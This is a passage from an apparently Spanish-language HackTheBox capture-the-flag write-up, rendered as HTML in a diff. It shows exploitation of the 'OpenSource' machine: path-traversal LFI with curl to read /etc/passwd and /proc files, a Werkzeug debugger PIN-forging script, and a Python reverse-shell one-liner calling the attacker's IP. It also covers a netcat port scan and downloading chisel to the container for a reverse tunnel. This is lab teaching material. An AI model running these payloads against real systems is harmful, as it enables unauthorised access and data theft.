+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + continued  nc -nlvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>                              reset xterm
+</span></span><span style="display:flex;"><span>/app <span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>/app <span style="color:#75715e"># export TERM=xterm</span>
+</span></span><span style="display:flex;"><span>/app <span style="color:#75715e"># export SHELL=/bin/sh</span>
+</span></span><span style="display:flex;"><span>/app <span style="color:#75715e"># </span>
+</span></span></code></pre></div><p>Hemos ganado acceso, pero al contenedor solamente.</p>
+<h3 id="LFI">Aplicando Local File Inclusion</h3>
+<p>Cuando descubrimos que se podía suplantar archivos únicamente agregando una diagonal al nombre del archivo, no probamos si podíamos aplicar <strong>LFI</strong>.</p>
+<p>Desde una petición <strong>POST</strong> no podremos. Vamos a probarlo desde una petición <strong>GET</strong>.</p>
+<p>Captura la petición de un archivo que hayas subido; en mi caso, capturaré el <strong>archivo test.txt</strong> que ya había subido:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura19.png">
+</p>
+<p>Bien, como este archivo existe, vamos a probar qué pasa si apuntamos al <strong>/etc/passwd</strong>:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura20.png">
+</p>
+<p>Nos está redireccionando.</p>
+<p>No servirá de nada ir a la redirección, por lo que vamos a probar si agregamos el clásico <code>../</code>, para probar si se aplica el <strong>LFI</strong>.</p>
+<p>Pruébalo y ve el resultado:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura21.png">
+</p>
+<p>Nos manda al <strong>information leakage</strong> del <strong>path</strong>.</p>
+<p>Ahora, probemos agregándole la diagonal que le falta y observamos el resultado:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura22.png">
+</p>
+<p>Excelente, entonces es posible aplicar <strong>LFI</strong> contra la página web.</p>
+<p>También podemos aplicarlo con <strong>curl</strong>, agregando el parámetro <code>--path-as-is</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl --path-as-is http://10.10.11.164/uploads/..//etc/passwd
+</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/ash
+</span></span><span style="display:flex;"><span>bin:x:1:1:bin:/bin:/sbin/nologin
+</span></span><span style="display:flex;"><span>daemon:x:2:2:daemon:/sbin:/sbin/nologin
+</span></span><span style="display:flex;"><span>adm:x:3:4:adm:/var/adm:/sbin/nologin
+</span></span><span style="display:flex;"><span>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+</span></span><span style="display:flex;"><span>sync:x:5:0:sync:/sbin:/bin/sync
+</span></span><span style="display:flex;"><span>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+</span></span><span style="display:flex;"><span>halt:x:7:0:halt:/sbin:/sbin/halt
+</span></span><span style="display:flex;"><span>mail:x:8:12:mail:/var/mail:/sbin/nologin
+</span></span><span style="display:flex;"><span>news:x:9:13:news:/usr/lib/news:/sbin/nologin
+</span></span><span style="display:flex;"><span>uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+</span></span><span style="display:flex;"><span>operator:x:11:0:operator:/root:/sbin/nologin
+</span></span><span style="display:flex;"><span>man:x:13:15:man:/usr/man:/sbin/nologin
+</span></span><span style="display:flex;"><span>postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
+</span></span><span style="display:flex;"><span>cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+</span></span><span style="display:flex;"><span>ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+</span></span><span style="display:flex;"><span>sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+</span></span><span style="display:flex;"><span>at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+</span></span><span style="display:flex;"><span>squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+</span></span><span style="display:flex;"><span>xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+</span></span><span style="display:flex;"><span>games:x:35:35:games:/usr/games:/sbin/nologin
+</span></span><span style="display:flex;"><span>cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+</span></span><span style="display:flex;"><span>vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+</span></span><span style="display:flex;"><span>ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+</span></span><span style="display:flex;"><span>smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+</span></span><span style="display:flex;"><span>guest:x:405:100:guest:/dev/null:/sbin/nologin
+</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/:/sbin/nologin
+</span></span></code></pre></div><p>Este parámetro sirve para ignorar la cabecera <strong>Content-Length</strong> y poder ver archivos de más de 2 GB.</p>
+<h3 id="pin">Ganando Acceso a la Consola de Flask Copiando el Proceso de Generación de PIN de Werkzeug</h3>
+<p>Esa consola que encontramos al aplicar <strong>Fuzzing</strong>, resulta ser un <strong>debugger de Flask</strong>.</p>
+<p>Existe una forma en la que podemos obtener ese <strong>PIN</strong> que nos pide; la puedes encontrar en <strong>HackTricks</strong>:</p>
+<ul>
+<li><a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug#werkzeug-console-pin-exploit" target="_blank">HackTricks: werkzeug</a></li>
+</ul>
+<p>La idea, es ocupar un script que nos permita obtener un <strong>PIN válido</strong> para ganar acceso a esa consola.</p>
+<p>Este script necesita ciertos datos que, en caso de poder aplicar <strong>LFI</strong>, podemos obtener, aunque algunos ya los tenemos.</p>
+<p>Necesita datos públicos y privados.</p>
+<p>Datos públicos:</p>
+<ul>
+<li><em>Username</em>: que ya vimos que el root es quien ejecuta el docker/servidor.</li>
+<li><em>modname</em>: que ya esta establecido como <em>flask.app</em>.</li>
+<li><em>getattr(app, &lsquo;<strong>name</strong>&rsquo;, getattr(app.<strong>class</strong>, &lsquo;<strong>name</strong>&rsquo;))</em>: ya esta establecido como <strong>Flask</strong>.</li>
+<li><em>getattr(mod, &lsquo;<strong>file</strong>&rsquo;, None)</em>: este representa la ruta completa a <strong>app.py</strong> dentro del directorio <strong>Flask</strong>, por ejemplo, <strong>/usr/local/lib/python3.5/dist-packages/flask/app.py</strong>. Este lo podemos obtener si buscamos un archivo no existente dentro de los archivos cargados, por ejemplo, trata de buscar el <strong>archivo test2.txt o test3.txt</strong> y observa el resultado:</li>
+</ul>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura23.png">
+</p>
+<p>Ahí esta la ruta completa del script <strong>app.py</strong>.</p>
+<p>Datos privados:</p>
+<ul>
+<li><em>uuid.getnode()</em>: este representa la <strong>MAC</strong> de la máquina víctima; debe estar en hexadecimal. Para obtener este, podemos aplicar un <strong>curl</strong> a la siguiente ruta: <code>/sys/class/net/&lt;device_id&gt;/address</code>, en donde debemos especificar la interfaz de red de la máquina.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl --path-as-is http://10.10.11.164/uploads/..//sys/class/net/eth0/address
+</span></span><span style="display:flex;"><span>02:42:ac:11:00:07
+</span></span><span style="display:flex;"><span>curl: <span style="color:#f92672">(</span>18<span style="color:#f92672">)</span> end of response with <span style="color:#ae81ff">4078</span> bytes missing
+</span></span></code></pre></div><p>Al ser un contenedor, estos tienen la interfaz <strong>eth0</strong> por defecto.</p>
+<p>Ahora, podemos pasar la <strong>MAC</strong> a hexadecimal usando <strong>Python</strong>. Elimina los <code>:</code> y pega el resultado en <strong>Python</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>python3
+</span></span><span style="display:flex;"><span>Python <span style="color:#ae81ff">3.12.6</span> (main, Sep  <span style="color:#ae81ff">7</span> <span style="color:#ae81ff">2024</span>, <span style="color:#ae81ff">14</span>:<span style="color:#ae81ff">20</span>:<span style="color:#ae81ff">15</span>) [GCC <span style="color:#ae81ff">14.2.0</span>] on linux
+</span></span><span style="display:flex;"><span>Type <span style="color:#e6db74">&#34;help&#34;</span>, <span style="color:#e6db74">&#34;copyright&#34;</span>, <span style="color:#e6db74">&#34;credits&#34;</span> <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;license&#34;</span> <span style="color:#66d9ef">for</span> more information<span style="color:#f92672">.</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#ae81ff">0x0242ac110007</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2485377892359</span>
+</span></span></code></pre></div><ul>
+<li><em>get_machine_id()</em>: se concatena la data de <code>/etc/machine-id</code>, o en caso de que no exista <code>/proc/sys/kernel/random/boot_id</code>, con el hash después de la diagonal de la data resultante de <code>/proc/self/cgroup</code>.</li>
+</ul>
+<p>Para obtener el primer dato, agregamos el parámetro <code>--ignore-content-length</code>, pues así no trata las secuencias de <code>/../</code> o <code>/./</code> en la <strong>ruta URL</strong> dada. Normalmente, <strong>curl</strong> las aplasta o fusiona de acuerdo con los estándares, pero con esta opción puedes decirle que no lo haga.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl --path-as-is --ignore-content-length http://10.10.11.164/uploads/..//proc/sys/kernel/random/boot_id
+</span></span><span style="display:flex;"><span>ec9352f3-f38c-4d69-ad41-55fe71f295ba
+</span></span></code></pre></div><p>Para el segundo dato, aplicamos lo mismo para la ruta que nos mencionan:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl --path-as-is --ignore-content-length http://10.10.11.164/uploads/..//proc/self/cgroup
+</span></span><span style="display:flex;"><span>12:cpuset:/docker/13b2cdc6369343a100be0437d9c4f4e32b7b882fbb76b2c49fa18a72b80f5799
+</span></span><span style="display:flex;"><span>11:pids:/docker/13b2cdc6369343a100be0437d9c4f4e32b7b882fbb76b2c49fa18a72b80f5799
+</span></span><span style="display:flex;"><span>10:hugetlb:/docker/13b2cdc6369343a100be0437d9c4f4e32b7b882fbb76b2c49fa18a72b80f5799
+</span></span><span style="display:flex;"><span>9:freezer:/docker/13b2cdc6369343a100be0437d9c4f4e32b7b882fbb76b2c49fa18a72b80f5799
+</span></span><span style="display:flex;"><span>8:net_cls,net_prio:/docker/13b2cdc6369343a100be0437d9c4f4e32b7b882fbb76b2c49fa18a72b80f5799
+</span></span><span style="display:flex;"><span>7:blkio:/docker/13b2cdc6369343a100be0437d9c4f4e32b7b882fbb76b2c49fa18a72b80f5799
+</span></span><span style="display:flex;"><span>6:cpu,cpuacct:/docker/13b2cdc6369343a100be0437d9c4f4e32b7b882fbb76b2c49fa18a72b80f5799
+</span></span><span style="display:flex;"><span>5:perf_event:/docker/13b2cdc6369343a100be0437d9c4f4e32b7b882fbb76b2c49fa18a72b80f5799
+</span></span><span style="display:flex;"><span>4:memory:/docker/13b2cdc6369343a100be0437d9c4f4e32b7b882fbb76b2c49fa18a72b80f5799
+</span></span><span style="display:flex;"><span>3:rdma:/
+</span></span><span style="display:flex;"><span>2:devices:/docker/13b2cdc6369343a100be0437d9c4f4e32b7b882fbb76b2c49fa18a72b80f5799
+</span></span><span style="display:flex;"><span>1:name<span style="color:#f92672">=</span>systemd:/docker/13b2cdc6369343a100be0437d9c4f4e32b7b882fbb76b2c49fa18a72b80f5799
+</span></span><span style="display:flex;"><span>0::/system.slice/snap.docker.dockerd.service
+</span></span></code></pre></div><p>Y ocupamos únicamente el <strong>hash</strong>, todos son iguales, por lo que puedes ocupar el que sea.</p>
+<p>Después de recopilar toda esta información, nuestro script quedaría de esta manera:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> hashlib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> itertools <span style="color:#f92672">import</span> chain
+</span></span><span style="display:flex;"><span>probably_public_bits <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;root&#39;</span>,  <span style="color:#75715e"># username</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;flask.app&#39;</span>,  <span style="color:#75715e"># modname</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Flask&#39;</span>,  <span style="color:#75715e"># getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;/usr/local/lib/python3.10/site-packages/flask/app.py&#39;</span>  <span style="color:#75715e"># getattr(mod, &#39;__file__&#39;, None),</span>
+</span></span><span style="display:flex;"><span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>private_bits <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;2485377892359&#39;</span>,  <span style="color:#75715e"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;ec9352f3-f38c-4d69-ad41-55fe71f295ba13b2cdc6369343a100be0437d9c4f4e32b7b882fbb76b2c49fa18a72b80f5799&#39;</span>  <span style="color:#75715e"># get_machine_id(), /etc/machine-id</span>
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><p>Ejecuta el script, deberías obtener un número que sería el <strong>PIN</strong> que para entrar a la consola interactiva:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python PIN_discover.py
+</span></span><span style="display:flex;"><span>135-767-720
+</span></span></code></pre></div><p>Copia el <strong>PIN</strong> e intenta entrar a la consola:</p>
+<p align="center">
+<img src="/assets/images/htb-writeup-opensource/Captura24.png">
+</p>
+<p>Hemos ganado acceso a la consola, ya solo es cuestión de obtener una <strong>shell</strong>.</p>
+<p>Abre una <strong>netcat</strong> y aplica la siguiente <strong>Reverse Shell</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span>subprocess<span style="color:#f92672">,</span>os;s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM);s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#34;Tu_IP&#34;</span>,<span style="color:#ae81ff">443</span>));os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>); os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>);os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>);<span style="color:#f92672">import</span> pty; pty<span style="color:#f92672">.</span>spawn(<span style="color:#e6db74">&#34;sh&#34;</span>)
+</span></span></code></pre></div><p>Observa el resultado:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#ae81ff">443</span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>Tu_IP<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.164<span style="color:#f92672">]</span> <span style="color:#ae81ff">35636</span>
+</span></span><span style="display:flex;"><span>/app <span style="color:#75715e"># whoami  </span>
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Haz un tratamiento de la <strong>TTY</strong> y continua.</p>
+<h3 id="docker">Enumeración de Contenedor Docker y Utilizando Chisel</h3>
+<p>Primero, veamos la IP del contenedor:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/app <span style="color:#75715e"># ifconfig</span>
+</span></span><span style="display:flex;"><span>ifconfig
+</span></span><span style="display:flex;"><span>eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:07  
+</span></span><span style="display:flex;"><span>          inet addr:172.17.0.7  Bcast:172.17.255.255  Mask:255.255.0.0
+</span></span><span style="display:flex;"><span>          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+</span></span><span style="display:flex;"><span>          RX packets:2254 errors:0 dropped:0 overruns:0 frame:0
+</span></span><span style="display:flex;"><span>          TX packets:2525 errors:0 dropped:0 overruns:0 carrier:0
+</span></span><span style="display:flex;"><span>          collisions:0 txqueuelen:0 
+</span></span><span style="display:flex;"><span>          RX bytes:193956 <span style="color:#f92672">(</span>189.4 KiB<span style="color:#f92672">)</span>  TX bytes:3672127 <span style="color:#f92672">(</span>3.5 MiB<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>lo        Link encap:Local Loopback  
+</span></span><span style="display:flex;"><span>          inet addr:127.0.0.1  Mask:255.0.0.0
+</span></span><span style="display:flex;"><span>          UP LOOPBACK RUNNING  MTU:65536  Metric:1
+</span></span><span style="display:flex;"><span>          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+</span></span><span style="display:flex;"><span>          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+</span></span><span style="display:flex;"><span>          collisions:0 txqueuelen:1000 
+</span></span><span style="display:flex;"><span>          RX bytes:0 <span style="color:#f92672">(</span>0.0 B<span style="color:#f92672">)</span>  TX bytes:0 <span style="color:#f92672">(</span>0.0 B<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Veamos la tabla de enrutamiento:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/app <span style="color:#75715e"># ip route</span>
+</span></span><span style="display:flex;"><span>ip route
+</span></span><span style="display:flex;"><span>default via 172.17.0.1 dev eth0 
+</span></span><span style="display:flex;"><span>172.17.0.0/16 dev eth0 scope link  src 172.17.0.7
+</span></span></code></pre></div><p>Parece que no estamos en la interfaz principal.</p>
+<p>Probemos si podemos alcanzar la interfaz principal:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/app <span style="color:#75715e"># ping -c 4 172.17.0.1</span>
+</span></span><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 172.17.0.1
+</span></span><span style="display:flex;"><span>PING 172.17.0.1 <span style="color:#f92672">(</span>172.17.0.1<span style="color:#f92672">)</span>: <span style="color:#ae81ff">56</span> data bytes
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 172.17.0.1: seq<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.123 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 172.17.0.1: seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.114 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 172.17.0.1: seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.181 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 172.17.0.1: seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">64</span> time<span style="color:#f92672">=</span>0.122 ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 172.17.0.1 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> packets received, 0% packet loss
+</span></span></code></pre></div><p>Sí lo alcanzamos.</p>
+<p>Cómo no tenemos <strong>nmap</strong>, podemos realizar un escaneo de puertos utilizando <strong>netcat</strong> dentro de un script de <strong>bash</strong>.</p>
+<p>Lo pondremos como un <strong>oneline</strong>r:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/app <span style="color:#75715e"># for port in $(seq 1 10000); do nc 172.17.0.1 $port -zv; done</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> port in <span style="color:#66d9ef">$(</span>seq <span style="color:#ae81ff">1</span> 10000<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> nc 172.17.0.1 $port -zv; <span style="color:#66d9ef">do</span>
+</span></span><span style="display:flex;"><span>ne
+</span></span><span style="display:flex;"><span>172.17.0.1 <span style="color:#f92672">(</span>172.17.0.1:22<span style="color:#f92672">)</span> open
+</span></span><span style="display:flex;"><span>172.17.0.1 <span style="color:#f92672">(</span>172.17.0.1:80<span style="color:#f92672">)</span> open
+</span></span><span style="display:flex;"><span>172.17.0.1 <span style="color:#f92672">(</span>172.17.0.1:3000<span style="color:#f92672">)</span> open
+</span></span><span style="display:flex;"><span>172.17.0.1 <span style="color:#f92672">(</span>172.17.0.1:6000<span style="color:#f92672">)</span> open
+</span></span><span style="display:flex;"><span>172.17.0.1 <span style="color:#f92672">(</span>172.17.0.1:6001<span style="color:#f92672">)</span> open
+</span></span><span style="display:flex;"><span>172.17.0.1 <span style="color:#f92672">(</span>172.17.0.1:6002<span style="color:#f92672">)</span> open
+</span></span><span style="display:flex;"><span>172.17.0.1 <span style="color:#f92672">(</span>172.17.0.1:6003<span style="color:#f92672">)</span> open
+</span></span><span style="display:flex;"><span>172.17.0.1 <span style="color:#f92672">(</span>172.17.0.1:6004<span style="color:#f92672">)</span> open
+</span></span><span style="display:flex;"><span>172.17.0.1 <span style="color:#f92672">(</span>172.17.0.1:6005<span style="color:#f92672">)</span> open
+</span></span><span style="display:flex;"><span>172.17.0.1 <span style="color:#f92672">(</span>172.17.0.1:6006<span style="color:#f92672">)</span> open
+</span></span><span style="display:flex;"><span>172.17.0.1 <span style="color:#f92672">(</span>172.17.0.1:6007<span style="color:#f92672">)</span> open
+</span></span></code></pre></div><p>Parece que el <strong>puerto 3000</strong> está almacenando algo.</p>
+<p>Usemos <strong>wget</strong> para ver qué es:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/app <span style="color:#75715e"># wget -qO- http://172.17.0.1:3000</span>
+</span></span><span style="display:flex;"><span>wget -qO- http://172.17.0.1:3000
+</span></span><span style="display:flex;"><span>&lt;!DOCTYPE html&gt;
+</span></span><span style="display:flex;"><span>&lt;html lang<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en-US&#34;</span> class<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;theme-&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;head&gt;
+</span></span><span style="display:flex;"><span>        &lt;meta charset<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;meta name<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> content<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1&#34;</span>&gt;
+</span></span><span style="display:flex;"><span>        &lt;title&gt; Gitea: Git with a cup of tea&lt;/title&gt;
+</span></span><span style="display:flex;"><span>        &lt;link rel<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;manifest&#34;</span> href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;data:application/json;base64,eyJuYW1lIjoiR2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">...
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">...
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">...
+</span></span></span></code></pre></div><p>Es una página llamada <strong>Gitea</strong>; investiguemos que es:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Gitea Software</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Gitea es un paquete de software de código abierto para alojar el control de versiones de desarrollo de software utilizando Git, así como otras funciones de colaboración como el seguimiento de errores y los wikis.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Entonces puede que aquí sirva la contraseña que encontramos al enumerar el <strong>repositorio local de git</strong>.</p>
+<p>Necesitamos ver la página y para lograr esto, utilizaremos la herramienta <strong>chisel</strong>.</p>
+<p>Descargala de aquí:</p>
+<ul>
+<li><a href="https://github.com/jpillora/chisel/releases" target="_blank">Repositorio de jpillora: chisel - releases</a></li>
+</ul>
+<p>Una vez que la descargues, descomprimerlo con <strong>gunzip</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gunzip chisel_1.10.1_linux_amd64.gz
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mv chisel_1.10.1_linux_amd64 chisel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>chmod +x chisel
+</span></span></code></pre></div><p>Ahora envíala al contenedor:</p>
+<ul>
+<li>Abre un servidor en <strong>Python</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">8000</span>
+</span></span><span style="display:flex;"><span>Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><ul>
+<li>En el contenedor, muevete al <strong>directorio /tmp</strong> y descarga <strong>chisel</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/tmp <span style="color:#75715e"># wget http://Tu_IP:8000/chisel</span>
+</span></span><span style="display:flex;"><span>wget http://Tu_IP:8000/chisel
+</span></span><span style="display:flex;"><span>Connecting to Tu_IP:8000 <span style="color:#f92672">(</span>Tu_IP:8000<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>saving to <span style="color:#e6db74">&#39;chisel&#39;</span>
+</span></span><span style="display:flex;"><span>chisel               100% |********************************| 9152k  0:00:00 ETA
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;chisel&#39;</span> saved
+</span></span></code></pre></div><p>Excelente, para que funcione <strong>chisel</strong> debemos abrir un servidor y un cliente, siendo que nuestra máquina será el servidor y el contenedor el cliente.</p>
+<p>Quedaría de esta forma:</p>
+<ul>
+<li>Nuestra máquina como servidor usando el <strong>puerto 1234</strong>:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>./chisel server --reverse -p <span style="color:#ae81ff">1234</span>
+</span></span><span style="display:flex;"><span>2024/10/08 01:04:31 server: Reverse tunnelling enabled
+</span></span><span style="display:flex;"><span>2024/10/08 01:04:31 server: Fingerprint +775...
+</span></span><span style="display:flex;"><span>2024/10/08 01:04:31 server: Listening on http://0.0.0.0:1234
+</span></span></code></pre></div><ul>
